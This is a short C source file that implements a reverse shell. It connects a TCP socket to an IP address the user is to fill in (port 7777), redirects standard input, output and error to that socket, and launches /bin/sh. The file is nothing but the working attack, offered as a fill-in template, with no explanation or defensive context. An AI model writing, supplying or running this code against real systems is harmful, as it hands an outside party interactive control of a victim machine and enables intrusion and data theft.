#include <unistd.h>
#include <arpa/inet.h>

#define PORT 7777 // The port here.

const char *ipAddress = ""; // Your IP Address here.

int main(void){

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    inet_aton(ipAddress, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	for (int i = 0; i < 3; i++) {
		dup2(sockfd, 0);
		dup2(sockfd, 1);
		dup2(sockfd, 2);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
 
}
